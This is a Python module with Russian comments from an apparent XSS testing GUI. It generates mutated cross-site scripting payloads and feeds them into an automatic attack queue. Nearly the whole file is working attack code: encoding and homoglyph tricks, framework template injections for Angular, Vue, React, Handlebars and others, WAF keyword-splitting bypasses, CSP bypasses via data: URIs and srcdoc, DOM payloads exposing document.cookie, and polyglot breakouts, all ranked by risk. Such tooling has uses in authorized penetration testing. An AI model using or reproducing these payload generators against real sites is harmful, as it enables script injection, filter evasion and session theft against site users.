# xss_security_gui/payload_mutator.py
"""
PayloadMutator ULTRA 6.x — боевой многопоточный мутатор XSS‑payload’ов.

Особенности:
• MutatorEngine + MutationFamilies + Risk Scoring
• Пул потоков (ThreadPoolExecutor), не блокирует GUI
• Расширенные библиотеки:
    - Polyglot / CSP‑aware / WAF‑bypass / DOM‑aware / Unicode / homoglyph / RTL / comment‑breaking
    - HTML / SVG / MathML / XML / JSON / URL / JS‑exec / data: / srcdoc / event‑handlers
• Интеграция:
    - PayloadManager (PAYLOADS, SQLite backend)
    - ThreatConnector (THREAT_CONNECTOR)
    - Priority Queue для автоатак (MUTATION_ATTACK_QUEUE)
• API:
    - mutate_payload(base_payload, ...)  — синхронный, возвращает список строк
    - mutate_async(base_payload, ...)    — асинхронный (через ThreadPoolExecutor)
    - mutate_task(task: dict)            — для MutatorTaskManager / attack_gui
"""

from __future__ import annotations

import base64
import logging
import random
import string
import urllib.parse
from html import escape
from concurrent.futures import ThreadPoolExecutor, Future
from dataclasses import dataclass
from typing import List, Dict, Any, Optional

from xss_security_gui.mutation_queue import MUTATION_ATTACK_QUEUE
from xss_security_gui.payloads import PAYLOADS
from xss_security_gui.threat_analysis.threat_connector import THREAT_CONNECTOR

log = logging.getLogger("PayloadMutatorULTRA")

_EXECUTOR = ThreadPoolExecutor(max_workers=8)


# ============================================================
#  Модели и константы
# ============================================================

@dataclass
class MutationOptions:
    framework: str = "generic"
    waf: bool = True
    dom: bool = True
    csp_aware: bool = True
    include_polyglot: bool = True
    max_mutants: Optional[int] = None
    target_url: Optional[str] = None
    context: Optional[str] = None  # html/js/attr/json/etc


@dataclass
class MutationResult:
    payload: str
    family: str
    risk: int
    tags: List[str]


FAMILY_BASE = "base"
FAMILY_FRAMEWORK = "framework"
FAMILY_WAF = "waf_bypass"
FAMILY_DOM = "dom_aware"
FAMILY_CSP = "csp_aware"
FAMILY_POLYGLOT = "polyglot"


# ============================================================
#  Вспомогательные мутации
# ============================================================

def _jsfuck_stub(payload: str) -> str:
    b64 = base64.b64encode(payload.encode()).decode()
    return f"/*jsfuck*/eval(atob('{b64}'))"


def _homoglyph(s: str) -> str:
    mapping = {
        "a": "а",
        "e": "е",
        "o": "о",
        "p": "р",
        "c": "с",
        "x": "х",
        "y": "у",
        "k": "к",
        "h": "һ",
    }
    return "".join(mapping.get(ch, ch) for ch in s)


def _random_noise(length: int = 5) -> str:
    return "".join(random.choice(string.ascii_letters) for _ in range(length))


def _random_case(s: str) -> str:
    return "".join(ch.upper() if random.random() < 0.5 else ch.lower() for ch in s)


def _break_tags(payload: str) -> str:
    return payload.replace("<", "<\n").replace(">", ">\n")


def _rtl_inject(s: str) -> str:
    rtl = "\u202e"
    return rtl + s


def _comment_break(s: str) -> str:
    return s.replace(">", "><!--xss-->").replace("<", "<!--xss--><")


# ============================================================
#  Базовые мутанты (расширенная библиотека)
# ============================================================

def _base_mutations(base_payload: str) -> List[MutationResult]:
    encoded = urllib.parse.quote(base_payload)
    double_encoded = urllib.parse.quote(encoded)
    escaped = escape(base_payload)
    b64 = base64.b64encode(base_payload.encode()).decode()

    muts: List[MutationResult] = []

    def add(p: str, risk: int = 50, tags: Optional[List[str]] = None):
        muts.append(MutationResult(payload=p, family=FAMILY_BASE, risk=risk, tags=tags or []))

    add(base_payload, risk=60, tags=["raw"])
    add(encoded, risk=55, tags=["urlencoded"])
    add(double_encoded, risk=50, tags=["double_urlencoded"])
    add(escaped, risk=45, tags=["html_escaped"])
    add(f"<img src=x onerror=eval(atob('{b64}'))>", risk=80, tags=["img_onerror", "b64"])
    add(f"<script>eval(atob('{b64}'))</script>", risk=85, tags=["script", "b64"])
    add(f"<svg><desc><![CDATA[{base_payload}]]></desc></svg>", risk=70, tags=["svg", "cdata"])
    add(f'"><svg/onload={base_payload}>', risk=80, tags=["svg", "attr_break"])
    add(f'");{base_payload}//', risk=75, tags=["js_break"])
    add(f'<iframe srcdoc="{base_payload}">', risk=80, tags=["iframe", "srcdoc"])
    add(f'" onmouseover={base_payload} x="', risk=75, tags=["event_handler"])
    add(f'</style>{base_payload}<style>', risk=70, tags=["css_break"])
    add(f"javascript:{base_payload}", risk=70, tags=["javascript_uri"])
    add(f'<body onload="{base_payload}">', risk=75, tags=["body_onload"])
    add(f'<a href="javascript:{base_payload}">click</a>', risk=70, tags=["link_js"])
    add(f"<!-->{base_payload}--><script>{base_payload}</script>", risk=80, tags=["comment_break"])
    add(_homoglyph(base_payload), risk=65, tags=["homoglyph"])
    add(urllib.parse.quote(base_payload + _random_noise()), risk=55, tags=["noise"])
    add(_jsfuck_stub(base_payload), risk=90, tags=["jsfuck_stub"])
    add(_break_tags(base_payload), risk=60, tags=["tag_break"])
    add(_random_case(base_payload), risk=55, tags=["random_case"])
    add(f"<!--xss-start-->{base_payload}<!--xss-end-->", risk=50, tags=["markers"])
    add(f'" autofocus onfocus={base_payload} x="', risk=75, tags=["autofocus"])
    add(f"<math><mtext>{base_payload}</mtext></math>", risk=65, tags=["mathml"])
    add(f"<?xml version='1.0'?><root>{base_payload}</root>", risk=60, tags=["xml"])
    add(f'{{"x":"{base_payload}"}}', risk=55, tags=["json"])
    add("".join(f"&#{ord(c)};" for c in base_payload), risk=60, tags=["html_entities"])
    add(_rtl_inject(base_payload), risk=65, tags=["rtl"])
    add(_comment_break(base_payload), risk=70, tags=["comment_break"])

    return muts


# ============================================================
#  Фреймворк‑специфичные мутанты
# ============================================================

def _framework_mutations(base_payload: str, framework: str, context: str = "auto") -> List[MutationResult]:
    fw = framework.lower()
    muts: List[MutationResult] = []

    def add(p: str, risk: int, tags: List[str]):
        muts.append(
            MutationResult(
                payload=p,
                family=FAMILY_FRAMEWORK,
                risk=risk,
                tags=[f"framework:{fw}", *tags]
            )
        )

    # ============================
    # Angular
    # ============================
    if fw == "angular":
        add(f"{{{{constructor.constructor('{base_payload}')()}}}}",
            risk=9, tags=["context:expression", "vector:constructor"])

        add(f"{{{{{base_payload}}}}}",
            risk=7, tags=["context:expression"])

        add(f'<img ng-src="{{{{{base_payload}}}}}" onerror="alert(1)">',
            risk=8, tags=["context:attr", "vector:ng-src"])

        add(f'<div ng-click="{base_payload}">',
            risk=7, tags=["context:attr", "vector:ng-click"])

        add(f'{{$onInit: function(){{ {base_payload} }}}}',
            risk=8, tags=["context:lifecycle"])

    # ============================
    # Vue.js
    # ============================
    elif fw == "vue":
        add(f"{{{{{base_payload}}}}}",
            risk=6, tags=["context:template"])

        add(f'<div v-on:click="{base_payload}">',
            risk=7, tags=["context:attr", "vector:v-on"])

        add(f'<a v-bind:href="{base_payload}">',
            risk=7, tags=["context:attr", "vector:v-bind"])

        add(f'<component :is="{base_payload}"></component>',
            risk=8, tags=["context:dynamic_component"])

    # ============================
    # React / JSX
    # ============================
    elif fw == "react":
        add(f'dangerouslySetInnerHTML={{"__html": "{base_payload}"}}',
            risk=8, tags=["context:jsx", "vector:dangerous_html"])

        add(f'onClick={{() => {base_payload}}}',
            risk=6, tags=["context:jsx", "vector:event"])

        add(f'<img src="#" onClick={{() => {base_payload}}} />',
            risk=6, tags=["context:jsx", "vector:event"])

        add(f'{{/* {base_payload} */}}',
            risk=4, tags=["context:comment"])

    # ============================
    # Handlebars
    # ============================
    elif fw == "handlebars":
        add(f"{{{{{{{base_payload}}}}}}}",
            risk=7, tags=["context:template"])

        add(f'{{{{#with "{base_payload}"}}}}',
            risk=6, tags=["context:block"])

        add(f'<script type="text/x-handlebars-template">{base_payload}</script>',
            risk=8, tags=["context:template_script"])

        add(f"{{{{#if {base_payload}}}}}XSS{{{{/if}}}}",
            risk=6, tags=["context:logic"])

    # ============================
    # Django Templates
    # ============================
    elif fw == "django":
        add(f"{{{{ {base_payload} }}}}",
            risk=5, tags=["context:template"])

        add(f"{{% if {base_payload} %}}XSS{{% endif %}}",
            risk=6, tags=["context:logic"])

    # ============================
    # Svelte
    # ============================
    elif fw == "svelte":
        add(f"<script>{base_payload}</script>",
            risk=7, tags=["context:script"])

        add(f"<div on:click=\"{base_payload}\">",
            risk=6, tags=["context:event"])

    # ============================
    # Alpine.js
    # ============================
    elif fw == "alpine":
        add(f'<div x-on:click="{base_payload}">',
            risk=6, tags=["context:event"])

        add(f'<div x-html="{base_payload}">',
            risk=8, tags=["context:html_injection"])

    return muts


# ============================================================
#  WAF‑bypass / CSP‑aware / DOM‑aware / Polyglot (ULTRA 6.x)
# ============================================================

def _waf_bypass_mutations(base_payload: str) -> List[MutationResult]:
    muts: List[MutationResult] = []

    def add(p: str, risk: int, tags: List[str]):
        muts.append(MutationResult(
            payload=p,
            family=FAMILY_WAF,
            risk=risk,
            tags=["family:waf", *tags]
        ))

    # Keyword splitting
    add(base_payload.replace("alert", "al" + "e" + "rt"),
        risk=7, tags=["vector:keyword_split"])

    add(base_payload.replace("alert", "self['al'+'ert']"),
        risk=8, tags=["vector:keyword_split", "context:js"])

    add(base_payload.replace("alert", "window['al'+'ert']"),
        risk=8, tags=["vector:keyword_split", "context:js"])

    # Script tag obfuscation
    add(base_payload.replace("<script", "<scr" + "ipt"),
        risk=7, tags=["vector:tag_split", "context:html"])

    # Charcode execution
    charcodes = ",".join(str(ord(c)) for c in "alert(1)")
    add(f"<script>eval(String.fromCharCode({charcodes}))</script>",
        risk=9, tags=["vector:charcode", "context:js"])

    # Event handler obfuscation
    add(base_payload.replace("onerror", "onerr" + "or"),
        risk=7, tags=["vector:event_split"])

    # Comment smuggling
    add(f"/*x*/{base_payload}/*y*/",
        risk=6, tags=["vector:comment_wrap"])

    # HTML entity obfuscation
    encoded = "".join(f"&#{ord(c)};" for c in base_payload)
    add(encoded, risk=8, tags=["vector:html_entities"])

    # Mixed-case obfuscation
    mixed = "".join(c.upper() if random.random() < 0.5 else c.lower() for c in base_payload)
    add(mixed, risk=6, tags=["vector:mixed_case"])

    return muts


def _dom_aware_mutations(base_payload: str) -> List[MutationResult]:
    muts: List[MutationResult] = []

    def add(p: str, risk: int, tags: List[str]):
        muts.append(MutationResult(
            payload=p,
            family=FAMILY_DOM,
            risk=risk,
            tags=["family:dom", *tags]
        ))

    add(base_payload.replace("alert(1)", "alert(document.domain)"),
        risk=8, tags=["vector:domain", "context:js"])

    add(base_payload.replace("alert(1)", "alert(location.href)"),
        risk=8, tags=["vector:location", "context:js"])

    add(base_payload.replace("alert(1)", "alert(document.cookie)"),
        risk=9, tags=["vector:cookie", "context:js"])

    add(base_payload.replace("alert(1)", "alert(window.name)"),
        risk=7, tags=["vector:window_name", "context:js"])

    # Additional DOM vectors
    add("setTimeout(`alert(1)`)", risk=7, tags=["vector:settimeout"])
    add("Function('alert(1)')()", risk=8, tags=["vector:function_ctor"])
    add("location='javascript:alert(1)'", risk=8, tags=["vector:location_js"])

    return muts


def _csp_aware_mutations(base_payload: str) -> List[MutationResult]:
    muts: List[MutationResult] = []

    def add(p: str, risk: int, tags: List[str]):
        muts.append(MutationResult(
            payload=p,
            family=FAMILY_CSP,
            risk=risk,
            tags=["family:csp", *tags]
        ))

    add("<script src=data:text/javascript,alert(1)></script>",
        risk=9, tags=["vector:data_js", "context:html"])

    add('<iframe srcdoc="<script>alert(1)</script>"></iframe>',
        risk=9, tags=["vector:iframe_srcdoc"])

    add('<img src=x onerror=alert(1)>',
        risk=7, tags=["vector:img_onerror"])

    add('<link rel="stylesheet" href="data:text/css,body{background:red}">',
        risk=6, tags=["vector:data_css"])

    # Additional CSP bypasses
    add('data:text/html,<script>alert(1)</script>',
        risk=9, tags=["vector:data_html"])

    add('<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        risk=8, tags=["vector:meta_refresh"])

    add("window.name='<img src=x onerror=alert(1)>'",
        risk=7, tags=["vector:window_name_smuggling"])

    return muts


def _polyglot_mutations(base_payload: str) -> List[MutationResult]:
    muts: List[MutationResult] = []

    def add(p: str, risk: int, tags: List[str]):
        muts.append(MutationResult(
            payload=p,
            family=FAMILY_POLYGLOT,
            risk=risk,
            tags=["family:polyglot", *tags]
        ))

    add("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//",
        risk=9, tags=["vector:javascript_uri"])

    add("</script><svg/onload=alert(1)>",
        risk=9, tags=["vector:svg_breakout"])

    add("'><img src=x onerror=alert(1)>",
        risk=8, tags=["vector:attr_break"])

    add("\";alert(1);//",
        risk=8, tags=["vector:js_break"])

    # HTML/JS/CSS polyglot
    add("<style>@import 'javascript:alert(1)';</style>",
        risk=9, tags=["vector:css_polyglot"])

    # JSON breakout polyglot
    add('"};alert(1);//',
        risk=8, tags=["vector:json_breakout"])

    return muts


# ============================================================
#  Генерация мутантов (движок)
# ============================================================

class MutatorEngine:
    """
    Основной движок генерации мутантов.
    """

    def generate(self, base_payload: str, options: MutationOptions) -> List[MutationResult]:
        all_mutants: List[MutationResult] = []

        all_mutants.extend(_base_mutations(base_payload))
        all_mutants.extend(_framework_mutations(base_payload, options.framework))

        if options.waf:
            all_mutants.extend(_waf_bypass_mutations(base_payload))

        if options.dom:
            all_mutants.extend(_dom_aware_mutations(base_payload))

        if options.csp_aware:
            all_mutants.extend(_csp_aware_mutations(base_payload))

        if options.include_polyglot:
            all_mutants.extend(_polyglot_mutations(base_payload))

        # Удаляем дубликаты по payload, оставляя максимальный risk
        unique: Dict[str, MutationResult] = {}
        for m in all_mutants:
            if m.payload not in unique or m.risk > unique[m.payload].risk:
                unique[m.payload] = m

        mutants = list(unique.values())
        mutants.sort(key=lambda m: m.risk, reverse=True)

        if options.max_mutants is not None:
            mutants = mutants[:options.max_mutants]

        log.info(
            f"[MutatorEngine] Generated {len(mutants)} mutants "
            f"for payload='{base_payload[:30]}...' framework={options.framework}"
        )

        # Отправляем артефакт в ThreatConnector (метаданные о генерации)
        try:
            artifact = {
                "module": "PayloadMutatorULTRA",
                "base_payload": base_payload,
                "framework": options.framework,
                "total_mutants": len(mutants),
                "timestamp": options.context or "",
                "target_url": options.target_url,
            }
            THREAT_CONNECTOR.add_artifact("PayloadMutatorULTRA", options.target_url or "mutator", [artifact])
        except Exception:
            pass

        return mutants


_ENGINE = MutatorEngine()

# ============================================================
#  Risk scoring + mutation families (ULTRA 6.x unified)
# ============================================================

def classify_family(mutant: str) -> str:
    """
    Классифицирует мутант по семейству.
    Используется для risk scoring и ThreatConnector.
    """
    m = mutant.lower()

    if any(tag in m for tag in ("<svg", "<iframe", "<img", "<math", "<body")):
        return "html_tag"

    if "javascript:" in m or "eval(" in m or "fromcharcode" in m:
        return "js_exec"

    if "data:text/javascript" in m or "srcdoc" in m:
        return "csp_bypass"

    if "%3c" in m or "%3e" in m or "%3cscript" in m:
        return "url_encoded"

    if any(fw in m for fw in ("constructor.constructor", "ng-", "v-on:", "dangerouslysetinnerhtml")):
        return "framework"

    if any(dom in m for dom in ("cookie", "document.domain", "location.href", "window.name")):
        return "dom_leak"

    if "jsfuck" in m or "string.fromcharcode" in m:
        return "obfuscation"

    if "<?xml" in m or "<xml" in m:
        return "xml"

    if "{" in m and "}" in m and ":" in m:
        return "json"

    return "generic"


def estimate_risk(mutant: str, family: str) -> int:
    """
    Оценивает риск мутанта (1–10).
    Чем выше риск — тем выше приоритет атаки.
    """
    m = mutant.lower()
    risk = 1

    if "alert(" in m:
        risk += 1
    if any(dom in m for dom in ("document.cookie", "document.domain", "location.href", "window.name")):
        risk += 3
    if "eval(" in m or "fromcharcode" in m:
        risk += 2
    if "data:text/javascript" in m or "srcdoc" in m:
        risk += 2
    if "javascript:" in m:
        risk += 1

    if family in ("dom_leak", "csp_bypass", "js_exec"):
        risk += 2
    if family in ("obfuscation", "framework"):
        risk += 1

    return min(risk, 10)


def build_structured_mutants(base_payload: str, framework: str) -> List[Dict[str, Any]]:
    """
    Возвращает структурированные мутанты:
    {
        "payload": "...",
        "family": "...",
        "risk": 8,
        "tags": [...]
    }
    """
    options = MutationOptions(framework=framework)
    results = _ENGINE.generate(base_payload, options)

    structured = []
    for m in results:
        structured.append({
            "payload": m.payload,
            "family": m.family,
            "risk": m.risk,
            "tags": m.tags,
        })

    return structured


# ============================================================
#  Основная задача мутатора (ThreatConnector + PayloadManager)
# ============================================================

def _mutate_task(category: str, payload: str, framework: str) -> Dict[str, int]:
    log.info(f"[MutatorULTRA] Генерация мутантов для {payload} ({framework})")

    options = MutationOptions(framework=framework)
    mutants = _ENGINE.generate(payload, options)

    added = 0
    families = set()
    max_risk = 0

    for m in mutants:
        families.add(m.family)
        max_risk = max(max_risk, m.risk)

        if PAYLOADS.add(category, m.payload):
            added += 1

            MUTATION_ATTACK_QUEUE.put((
                -m.risk,
                {
                    "category": category,
                    "payload": m.payload,
                    "framework": framework,
                    "family": m.family,
                    "risk": m.risk,
                    "tags": m.tags,
                }
            ))

    # ThreatConnector
    try:
        THREAT_CONNECTOR.emit(
            module="PayloadMutatorULTRA",
            target=category,
            result={
                "severity": "high" if max_risk >= 7 else "info",
                "category": "payload_mutation",
                "source": "PayloadMutatorULTRA",
                "framework": framework,
                "base_payload": payload,
                "generated": added,
                "total_mutants": len(mutants),
                "unique_families": list(families),
                "max_risk": max_risk,
                "mutants_preview": [m.payload for m in mutants[:5]],
            },
        )
    except Exception as e:
        log.warning(f"[MutatorULTRA] Ошибка ThreatConnector.emit: {e}")

    log.info(f"[MutatorULTRA] добавлено {added} мутантов (из {len(mutants)})")

    return {
        "generated": added,
        "total_mutants": len(mutants),
    }


# ============================================================
#  Публичный API (совместимость)
# ============================================================

def mutate_task(category: str, payload: str, framework: str = "generic") -> Dict[str, int]:
    return _mutate_task(category, payload, framework)


def mutate_async(category: str, payload: str, framework: str = "generic") -> Future:
    return _EXECUTOR.submit(_mutate_task, category, payload, framework)


def mutate_payload(base: str, framework: str = "generic") -> List[str]:
    """
    Синхронный API: возвращает список payload-строк.
    """
    if not base or not isinstance(base, str):
        return []

    try:
        options = MutationOptions(framework=framework)
        results = _ENGINE.generate(base, options)
        return [m.payload for m in results]
    except Exception as e:
        log.error(f"[MutatorULTRA] ошибка при генерации мутантов: {e}")
        return []